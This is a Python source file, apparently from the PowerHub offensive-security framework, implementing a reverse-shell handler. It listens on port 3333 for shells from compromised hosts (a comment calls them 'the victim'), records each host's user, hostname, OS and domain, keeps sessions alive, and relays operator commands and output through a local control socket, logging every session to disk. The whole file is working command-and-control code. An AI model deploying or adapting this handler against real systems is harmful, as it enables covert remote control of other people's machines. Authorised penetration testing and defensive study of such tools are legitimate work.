import json
import os
import random
import select
import socket
import struct
import threading
from datetime import datetime as dt
import email.utils as eut

from powerhub.directories import XDG_DATA_HOME
from powerhub.logging import log

T_JSON = 0
T_DICT = 1


class ReverseShell(threading.Thread):
    # a random string
    SHELL_HELLO = bytes([0x21, 0x9e, 0x10, 0x55, 0x75, 0x6a, 0x1a, 0x6b])
    signal_pipe = os.pipe()

    def __init__(self, sock, key=None):
        super(ReverseShell, self).__init__()
        self.details = {}
        self.rsock = sock  # the remote socket connected to the victim
        self.lsock = None  # the local socket for shell interaction
        self.key = key
        self.log = []
        self.get_shell_hello()
        self.created = dt(*eut.parsedate(self.details["created"])[:6])
        host, port = sock.getpeername()
        self.details["peer_host"] = host
        self.details["peer_port"] = port
        self.description = ("[%(id)s] %(user)s@%(hostname)s "
                            "(%(peer_host)s:%(peer_port)d)") % self.details
        self.read_socks = [self.rsock, self.signal_pipe[0]]
        self.write_socks = []
        self.queue = {
            self.rsock: []
        }
        self.active = True
        log.info("%s - %s - Reverse Shell caught" % (
                    host,
                    self.details["id"],
                    ))

    def unset_lsock(self):
        if not self.lsock:
            return None
        self.queue.pop(self.lsock)
        self.read_socks.remove(self.lsock)
        if self.lsock in self.write_socks:
            self.write_socks.remove(self.lsock)
        self.lsock.close()
        self.lsock = None
        log.debug("%s - Connection to local shell closed" %
                  (self.details["id"]))

    def set_lsock(self, sock):
        if self.lsock:
            self.unset_lsock()
        self.lsock = sock
        self.read_socks = [self.rsock, self.lsock, self.signal_pipe[0]]
        self.queue[self.lsock] = []
        self.deliver_backlog()

    def is_stale(self):
        now = dt.now()
        return (now-self.t_sign_of_life).total_seconds() > 30

    def last_seen(self):
        return str(self.t_sign_of_life).split('.')[0]

    def kill(self):
        log.info("%s - Killing shell" % (self.details["id"]))
        p = ShellPacket(T_DICT, {"msg_type": "KILL", "data": ""})
        self.write_shell_packet(p, self.rsock)

    def get_shell_hello(self):
        r, _, _ = select.select([self.rsock], [], [])
        firstbytes = r[0].recv(8, socket.MSG_PEEK)
        if firstbytes == self.SHELL_HELLO:  # or rc4(shell_hello) TODO
            r[0].recv(8)
            p = self.read_shell_packet(self.rsock)
            self.shell_type = 'smart'
            self.details.update(p["data"])
        else:
            self.shell_type = 'dumb'
            self.details["id"] = hex(random.getrandbits(64))
            self.details["created"] = eut.formatdate(timeval=None,
                                                     localtime=False,
                                                     usegmt=True)
            for key in ["user", "host", "ps_version", "os_version",
                        "arch", "domain"]:
                self.details[key] = '?'

    def write_shell_packet(self, p, s):
        """Convert a ShellPacket to a byte string and send it across the
        wire"""

        s.send(p.serialize())
        p.set_delivered()

    def read_shell_packet(self, s):
        """Deserialize byte string and instantiate ShellPacket"""
        header = s.recv(6)
        if not header:
            return None
        packet_type, packet_length = struct.unpack('>HI', header)
        body = b''
        while len(body) < packet_length:
            body += s.recv(packet_length-len(body))
        p = ShellPacket(packet_type, body)
        if p['msg_type'] == "PONG":
            log.debug("%s - Pong" % (self.details["id"]))
        elif p['msg_type'] == "KILL" and p['data'] == "confirm":
            log.info("%s - Shell has died" % (self.details["id"]))
            self.active = False
            self.unset_lsock()
            return p
        self.append_to_log(p)
        if s == self.rsock:
            sender = "reverse shell"
            self.t_sign_of_life = dt.now()
            if self.lsock:
                self.deliver(p, self.lsock)
        else:
            sender = "local shell"
            self.deliver(p, self.rsock)
        host, port = s.getpeername()
        log.debug("%s - %s - From %s: %s" % (
                    host,
                    self.details["id"] if "id" in self.details else "?",
                    sender,
                    p
                    ))
        return p

    def append_to_log(self, p):
        """Append the packet to log and write to file"""
        self.log.append(p)
        if p.is_printable():
            timestamp = self.created
            timestamp = str(timestamp).replace(" ", "_")
            filename = "shell_%s_%s.txt" % (timestamp, self.details["id"])
            filename = os.path.join(XDG_DATA_HOME, filename)
            with open(filename, 'a+') as f:
                f.write(p.shell_string(colors=False))
                if p["msg_type"] == "COMMAND":
                    f.write("\n")

    def deliver(self, packet, sock):
        """Puts a packet in the queue belonging to the socket it should be
        written to"""

        self.queue[sock].append(packet)
        self.write_socks.append(sock)
        os.write(self.signal_pipe[1], b"x")

    def deliver_backlog(self):
        """Delivers packets which haven't been delivered yet to local
        socket"""

        backlog = [x for x in self.log if not x.delivered]
        if backlog:
            for p in backlog:
                self.deliver(p, self.lsock)
        else:
            prompts = [x for x in self.log if x["msg_type"] == "PROMPT"]
            if prompts:
                self.deliver(prompts[-1], self.lsock)

    def get_log(self):
        """Return the entire log as a string"""

        result = ""
        for p in self.log:
            if p.is_printable():
                result += p.shell_string(colors=False)
                if p["msg_type"] in ["COMMAND"]:
                    result += "\n"
        return result

    def ping(self, s):
        now = dt.now()
        if (now-self.t_sign_of_life).total_seconds() > 10:
            log.debug("%s - Ping" % (self.details["id"]))
            p = ShellPacket(T_DICT, {"msg_type": "PING", "data": ""})
            self.write_shell_packet(p, s)

    def run(self):
        while self.active:
            r, w, _ = select.select(self.read_socks, self.write_socks, [], 5)
            for s in r:
                if s == self.signal_pipe[0]:
                    # this was only a signal to interrupt the select block,
                    # do nothing
                    os.read(s, 1024)
                else:
                    try:
                        if not self.read_shell_packet(s):
                            if s == self.lsock:
                                self.unset_lsock()
                                break
                            elif s == self.rsock:
                                log.info("Connection to reverse shell lost")
                                self.unset_lsock()
                                break
                    except ConnectionResetError:
                        return None
                    except Exception:
                        log.exception(
                            "Exception caught while reading shell packets"
                        )
                        break
            try:
                if not w:
                    self.ping(self.rsock)
                for s in w:
                    for p in self.queue[s]:
                        self.write_shell_packet(p, s)
                    self.queue[s] = []
                    self.write_socks.remove(s)
            except Exception:
                log.exception(
                    "Exception caught while writing shell packets"
                )
                break


class ShellPacket(object):
    class bcolors:
        VERBOSE = '\033[33m'
        WARNING = '\033[1;92m'
        ERROR = '\033[31m'
        DEBUG = '\033[92m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'

    def __init__(self, packet_type, body):
        if packet_type == T_JSON:
            try:
                self.json = json.loads(body.decode())
            except Exception:
                print(body.decode())
        elif packet_type == T_DICT:
            self.json = body
        else:
            raise Exception
        if not self.json["data"]:
            self.json["data"] = ""
        self.delivered = False

    def set_delivered(self):
        self.delivered = True

    def serialize(self):
        """Return a byte string of the ShellPacket"""

        buffer = json.dumps(self.json).encode()
        packet_length = len(buffer)
        packet_type = T_JSON
        header = struct.pack('>HI', packet_type, packet_length)
        return (header + buffer)

    def __getitem__(self, key):
        return self.json[key]

    def __str__(self):
        return json.dumps(self.json)

    def shell_string(self, colors=True):
        if self["msg_type"] in ["OUTPUT", "COMMAND"]:
            return self["data"]
        if self["msg_type"] == "TABCOMPL":
            return json.dumps(self["data"])
        if self["msg_type"] == "STREAM_INFORMATION":
            return self["data"] + "\n"
        elif self["msg_type"] == "PROMPT":
            return self["data"]
        elif self["msg_type"] == "STREAM_VERBOSE":
            return "%s%s%s\n" % (
                self.bcolors.VERBOSE if colors else "",
                self["data"],
                self.bcolors.ENDC if colors else "",
            )
        elif self["msg_type"] in ["STREAM_EXCEPTION", "STREAM_ERROR"]:
            return "%s%s%s\n" % (
                self.bcolors.ERROR if colors else "",
                self["data"],
                self.bcolors.ENDC if colors else "",
            )
        elif self["msg_type"] == "STREAM_WARNING":
            return "%s%s%s\n" % (
                self.bcolors.WARNING if colors else "",
                self["data"],
                self.bcolors.ENDC if colors else "",
            )
        elif self["msg_type"] == "STREAM_DEBUG":
            return "%s%s%s\n" % (
                self.bcolors.DEBUG if colors else "",
                self["data"],
                self.bcolors.ENDC if colors else "",
            )
        elif self["msg_type"] == "SHELL_HELLO":
            result = ""
            for key, val in self.json["data"].items():
                result += "%s:\t%s\n" % (key, val)
            return result
        else:
            return ""

    def is_printable(self):
        return self["msg_type"] in [
            "COMMAND",
            "PROMPT",
            "OUTPUT",
        ] or (self["msg_type"].startswith("STREAM_") and self["data"])


class ShellReceiver(object):
    def __init__(self, push_notification=None):
        self.rsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.rsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.shells = []
        self.push_notification = push_notification

        self.lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run_receiver(self, host='0.0.0.0', port=3333):
        """Start listener for incoming reverse shells"""

        self.rsock.bind((host, port))
        self.rsock.listen(128)
        while True:
            connection, addr = self.rsock.accept()
            rs = ReverseShell(connection)
            stale_shells = [s for s in self.shells
                            if s.details["id"] == rs.details["id"]]
            for s in stale_shells:
                s.unset_lsock()
            self.shells.append(rs)
            rs.start()
            if self.push_notification:
                self.push_notification(
                    'info',
                    'Reverse shell caught from %s:%d' % addr,
                    'Receiver',
                    shellid=rs.details["id"],
                )

    def run_provider(self, host='127.0.0.1', port=18157):
        """Provides a service where you can interact with caught shells"""

        self.lsock.bind((host, port))
        self.lsock.listen(128)
        while True:
            connection, addr = self.lsock.accept()
            r, _, _ = select.select([connection], [], [])
            id = connection.recv(8).decode()
            if not id:
                break
            peer_shell = [s for s in self.shells if s.details["id"] ==
                          id]
            if not peer_shell:
                log.error("No shell with ID %s found" % id)
                connection.close()
            peer_shell[0].set_lsock(connection)
            log.info("%s - %s - Connected local and reverse shell" % (
                        addr[0],
                        id,
                        ))

    def get_shell_by_id(self, shell_id):
        return [s for s in self.shells if s.details['id'] == shell_id][0]

    def active_shells(self):
        return [s for s in self.shells if s.active]

    def forget_shell(self, shell_id):
        shell = self.get_shell_by_id(shell_id)
        self.shells.remove(shell)
